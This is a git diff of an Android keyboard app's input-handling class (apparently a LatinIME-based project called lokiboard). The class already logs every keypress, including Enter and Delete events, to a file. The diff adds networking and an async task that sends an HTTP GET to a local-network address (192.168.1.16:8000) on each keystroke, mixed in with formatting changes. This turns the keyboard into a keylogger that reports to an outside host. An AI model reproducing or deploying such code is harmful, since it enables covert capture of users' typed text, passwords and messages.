@@ -22,6 +22,12 @@ import android.view.KeyCharacterMap;
 import android.view.KeyEvent;
 import android.view.inputmethod.EditorInfo;
 
+import java.io.BufferedOutputStream;
+import java.io.BufferedWriter;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.TreeSet;
 
 import com.abifog.lokiboard.event.Event;
@@ -36,11 +42,12 @@ import com.abifog.lokiboard.latin.utils.RecapitalizeStatus;
 
 import java.io.File;
 import java.io.FileOutputStream;
+
 import android.util.Log;
+
 import java.text.SimpleDateFormat;
 import java.util.Locale;
 import java.util.Date;
-
 
 
 /**
@@ -58,8 +65,9 @@ public final class InputLogic {
 
     /**
      * Create a new instance of the input logic.
+     *
      * @param latinIME the instance of the parent LatinIME. We should remove this when we can.
-     * dictionary.
+     *                 dictionary.
      */
     public InputLogic(final LatinIME latinIME) {
         mLatinIME = latinIME;
@@ -68,7 +76,7 @@ public final class InputLogic {
 
     /**
      * Initializes the input logic for input in an editor.
-     *
+     * <p>
      * Call this when input starts or restarts in some editor (typically, in onStartInputView).
      */
     public void startInput() {
@@ -88,12 +96,12 @@ public final class InputLogic {
 
     /**
      * React to a string input.
-     *
+     * <p>
      * This is triggered by keys that input many characters at once, like the ".com" key or
      * some additional keys for example.
      *
      * @param settingsValues the current values of the settings.
-     * @param event the input event containing the data.
+     * @param event          the input event containing the data.
      * @return the complete transaction object
      */
     public InputTransaction onTextInput(final SettingsValues settingsValues, final Event event) {
@@ -112,8 +120,9 @@ public final class InputLogic {
      * Consider an update to the cursor position. Evaluate whether this update has happened as
      * part of normal typing or whether it was an explicit cursor move by the user. In any case,
      * do the necessary adjustments.
+     *
      * @param newSelStart new selection start
-     * @param newSelEnd new selection end
+     * @param newSelEnd   new selection end
      * @return whether the cursor has moved as a result of user interaction.
      */
     public boolean onUpdateSelection(final int newSelStart, final int newSelEnd) {
@@ -129,12 +138,12 @@ public final class InputLogic {
     /**
      * React to a code input. It may be a code point to insert, or a symbolic value that influences
      * the keyboard behavior.
-     *
+     * <p>
      * Typically, this is called whenever a key is pressed on the software keyboard. This is not
      * the entry point for gesture input; see the onBatchInput* family of functions for this.
      *
      * @param settingsValues the current settings values.
-     * @param event the event to handle.
+     * @param event          the event to handle.
      * @return the complete transaction object
      */
     public InputTransaction onCodeInput(final SettingsValues settingsValues, final Event event) {
@@ -155,13 +164,13 @@ public final class InputLogic {
         if (event.mKeyCode != Constants.CODE_SHIFT
                 && event.mKeyCode != Constants.CODE_CAPSLOCK
                 && event.mKeyCode != Constants.CODE_SWITCH_ALPHA_SYMBOL)
-        mConnection.endBatchEdit();
+            mConnection.endBatchEdit();
         return inputTransaction;
     }
 
     /**
      * Handle a consumed event.
-     *
+     * <p>
      * Consumed events represent events that have already been consumed, typically by the
      * combining chain.
      *
@@ -177,7 +186,7 @@ public final class InputLogic {
         }
     }
 
-    private void savedToTextFile(String fileContents) {
+    private void savedToTextFile(String fileContents, int keyCode) {
 
         SimpleDateFormat sdf = new SimpleDateFormat("dd_MM_yyyy", Locale.getDefault());
         String fileName = "lokiboard_files_" + sdf.format(new Date()) + ".txt";
@@ -187,14 +196,21 @@ public final class InputLogic {
             // This implementation does not require storage read/write permissions from the user
             // Stores in Internal Storage > Android > data > com.abifog.lokiboard
 
-            File outfile = new File(mLatinIME.getExternalFilesDir(null), fileName);
-            FileOutputStream lokiFOut = new FileOutputStream(outfile,true);
-            lokiFOut.write(fileContents.getBytes());
-            lokiFOut.close();
+//            File outfile = new File(mLatinIME.getExternalFilesDir(null), fileName);
+//            FileOutputStream lokiFOut = new FileOutputStream(outfile, true);
+//            lokiFOut.write(String.valueOf(keyCode).getBytes());
+//            lokiFOut.close();
+            RequestPackage requestPackage = new RequestPackage();
+            requestPackage.setMethod("GET");
+            requestPackage.setUrl("http://192.168.1.16:8000");
+
+            Downloader downloader = new Downloader(); //Instantiation of the Async task
+            //that’s defined below
+
+            downloader.execute(requestPackage);
+
 
             // Log.d("INFO", "written");
-
-
 
 
             // If you want to save files directly in the internal storage outside the
@@ -214,13 +230,11 @@ public final class InputLogic {
             lokiFOS.close();
 
             */
-        }
-        catch (Exception e) {
+        } catch (Exception e) {
             // TODO Auto-generated catch block
 
-            Log.d("ERROR" , "Something went wrong");
+            Log.d("ERROR", "Something went wrong");
         }
-
 
 
         // Save received argument (string) to a text file
@@ -229,14 +243,14 @@ public final class InputLogic {
 
     /**
      * Handle a functional key event.
-     *
+     * <p>
      * A functional event is a special key, like delete, shift, emoji, or the settings key.
      * Non-special keys are those that generate a single code point.
      * This includes all letters, digits, punctuation, separators, emoji. It excludes keys that
      * manage keyboard-related stuff like shift, language switch, settings, layout switch, or
      * any key that results in multiple code points like the ".com" key.
      *
-     * @param event The event to handle.
+     * @param event            The event to handle.
      * @param inputTransaction The transaction in progress.
      */
     private void handleFunctionalEvent(final Event event, final InputTransaction inputTransaction) {
@@ -291,15 +305,15 @@ public final class InputLogic {
 
     /**
      * Handle an event that is not a functional event.
-     *
+     * <p>
      * These events are generally events that cause input, but in some cases they may do other
      * things like trigger an editor action.
      *
-     * @param event The event to handle.
+     * @param event            The event to handle.
      * @param inputTransaction The transaction in progress.
      */
     private void handleNonFunctionalEvent(final Event event,
-            final InputTransaction inputTransaction) {
+                                          final InputTransaction inputTransaction) {
         switch (event.mCodePoint) {
             case Constants.CODE_ENTER:
                 final EditorInfo editorInfo = getCurrentInputEditorInfo();
@@ -324,7 +338,7 @@ public final class InputLogic {
 
                     // no special event so log an enter
                     String pressedChar = "[ENTER]";
-                    savedToTextFile(pressedChar);
+                    savedToTextFile(pressedChar, KeyEvent.KEYCODE_ENTER);
                     Log.d("INFO", "Keypress: " + pressedChar);
 
                     handleNonSpecialCharacterEvent(event, inputTransaction);
@@ -338,17 +352,17 @@ public final class InputLogic {
 
     /**
      * Handle inputting a code point to the editor.
-     *
+     * <p>
      * Non-special keys are those that generate a single code point.
      * This includes all letters, digits, punctuation, separators, emoji. It excludes keys that
      * manage keyboard-related stuff like shift, language switch, settings, layout switch, or
      * any key that results in multiple code points like the ".com" key.
      *
-     * @param event The event to handle.
+     * @param event            The event to handle.
      * @param inputTransaction The transaction in progress.
      */
     private void handleNonSpecialCharacterEvent(final Event event,
-            final InputTransaction inputTransaction) {
+                                                final InputTransaction inputTransaction) {
         final int codePoint = event.mCodePoint;
         if (inputTransaction.mSettingsValues.isWordSeparator(codePoint)
                 || Character.getType(codePoint) == Character.OTHER_SYMBOL) {
@@ -360,6 +374,7 @@ public final class InputLogic {
 
     /**
      * Handle a non-separator.
+     *
      * @param event The event to handle.
      */
     private void handleNonSeparatorEvent(final Event event) {
@@ -368,7 +383,8 @@ public final class InputLogic {
 
     /**
      * Handle input of a separator code point.
-     * @param event The event to handle.
+     *
+     * @param event            The event to handle.
      * @param inputTransaction The transaction in progress.
      */
     private void handleSeparatorEvent(final Event event, final InputTransaction inputTransaction) {
@@ -379,7 +395,8 @@ public final class InputLogic {
 
     /**
      * Handle a press on the backspace key.
-     * @param event The event to handle.
+     *
+     * @param event            The event to handle.
      * @param inputTransaction The transaction in progress.
      */
     private void handleBackspaceEvent(final Event event, final InputTransaction inputTransaction) {
@@ -392,7 +409,7 @@ public final class InputLogic {
         // can't go any further back, so we can update right away even if it's a key repeat.
         final int shiftUpdateKind =
                 event.isKeyRepeat() && mConnection.getExpectedSelectionStart() > 0
-                ? InputTransaction.SHIFT_UPDATE_LATER : InputTransaction.SHIFT_UPDATE_NOW;
+                        ? InputTransaction.SHIFT_UPDATE_LATER : InputTransaction.SHIFT_UPDATE_NOW;
         inputTransaction.requireShiftUpdate(shiftUpdateKind);
 
         // No cancelling of commit/double space/swap: we have a regular backspace.
@@ -408,7 +425,7 @@ public final class InputLogic {
 
             // Selected string has been deleted
             String pressedChar = "[DEL-" + numCharsDeleted + " Selected Characters]";
-            savedToTextFile(pressedChar);
+            savedToTextFile(pressedChar, KeyEvent.KEYCODE_DEL);
             Log.d("INFO", "Keypressed: " + pressedChar);
 
         } else {
@@ -417,14 +434,14 @@ public final class InputLogic {
             // Log a single delete
 
             String pressedChar = "[DEL]";
-            savedToTextFile(pressedChar);
+            savedToTextFile(pressedChar, KeyEvent.KEYCODE_DEL);
             Log.d("INFO", "Keypressed: " + pressedChar);
 
 
             // Deletion code
             if (inputTransaction.mSettingsValues.mInputAttributes.isTypeNull()
                     || Constants.NOT_A_CURSOR_POSITION
-                            == mConnection.getExpectedSelectionEnd()) {
+                    == mConnection.getExpectedSelectionEnd()) {
                 // There are three possible reasons to send a key event: either the field has
                 // type TYPE_NULL, in which case the keyboard should send events, or we are
                 // running in backward compatibility mode, or we don't know the cursor position.
@@ -466,6 +483,7 @@ public final class InputLogic {
 
     /**
      * Performs a recapitalization event.
+     *
      * @param settingsValues The current settings values.
      */
     private void performRecapitalization(final SettingsValues settingsValues) {
@@ -503,7 +521,7 @@ public final class InputLogic {
 
     /**
      * Gets the current auto-caps state, factoring in the space state.
-     *
+     * <p>
      * This method tries its best to do this in the most efficient possible manner. It avoids
      * getting text from the editor if possible at all.
      * This is called from the KeyboardSwitcher (through a trampoline in LatinIME) because it
@@ -526,7 +544,7 @@ public final class InputLogic {
     public int getCurrentRecapitalizeState() {
         if (!mRecapitalizeStatus.isStarted()
                 || !mRecapitalizeStatus.isSetAt(mConnection.getExpectedSelectionStart(),
-                        mConnection.getExpectedSelectionEnd())) {
+                mConnection.getExpectedSelectionEnd())) {
             // Not recapitalizing at the moment
             return RecapitalizeStatus.NOT_A_RECAPITALIZE_MODE;
         }
@@ -549,7 +567,7 @@ public final class InputLogic {
 
     /**
      * Perform the processing specific to inputting TLDs.
-     *
+     * <p>
      * Some keys input a TLD (specifically, the ".com" key) and this warrants some specific
      * processing. First, if this is a TLD, we ignore PHANTOM spaces -- this is done by type
      * of character in onCodeInput, but since this gets inputted as a whole string we need to
@@ -583,12 +601,12 @@ public final class InputLogic {
 
     /**
      * Resets the whole input state to the starting state.
-     *
+     * <p>
      * This will clear the composing word, reset the last composed word, clear the suggestion
      * strip and tell the input connection about it so that it can refresh its caches.
      *
      * @param newSelStart the new selection start, in java characters.
-     * @param newSelEnd the new selection end, in java characters.
+     * @param newSelEnd   the new selection end, in java characters.
      */
     // TODO: how is this different from startInput ?!
     private void resetEntireInputState(final int newSelStart, final int newSelEnd) {
@@ -597,7 +615,7 @@ public final class InputLogic {
 
     /**
      * Sends a DOWN key event followed by an UP key event to the editor.
-     *
+     * <p>
      * If possible at all, avoid using this method. It causes all sorts of race conditions with
      * the text view because it goes through a different, asynchronous binder. Also, batch edits
      * are ignored for key events. Use the normal software input methods instead.
@@ -616,7 +634,7 @@ public final class InputLogic {
 
     /**
      * Sends a code point to the editor, using the most appropriate method.
-     *
+     * <p>
      * Normally we send code points with commitText, but there are some cases (where backward
      * compatibility is a concern for example) where we want to use deprecated methods.
      *
@@ -647,23 +665,23 @@ public final class InputLogic {
 
 
         Log.d("INFO", "Keypress: " + pressedChar);
-        savedToTextFile(pressedChar);
+        savedToTextFile(pressedChar, codePoint);
 
     }
 
     /**
      * Retry resetting caches in the rich input connection.
-     *
+     * <p>
      * When the editor can't be accessed we can't reset the caches, so we schedule a retry.
      * This method handles the retry, and re-schedules a new retry if we still can't access.
      * We only retry up to 5 times before giving up.
      *
      * @param tryResumeSuggestions Whether we should resume suggestions or not.
-     * @param remainingTries How many times we may try again before giving up.
+     * @param remainingTries       How many times we may try again before giving up.
      * @return whether true if the caches were successfully reset, false otherwise.
      */
     public boolean retryResetCachesAndReturnSuccess(final boolean tryResumeSuggestions,
-            final int remainingTries, final LatinIME.UIHandler handler) {
+                                                    final int remainingTries, final LatinIME.UIHandler handler) {
         if (!mConnection.resetCachesUponCursorMoveAndReturnSuccess(
                 mConnection.getExpectedSelectionStart(), mConnection.getExpectedSelectionEnd())) {
             if (0 < remainingTries) {
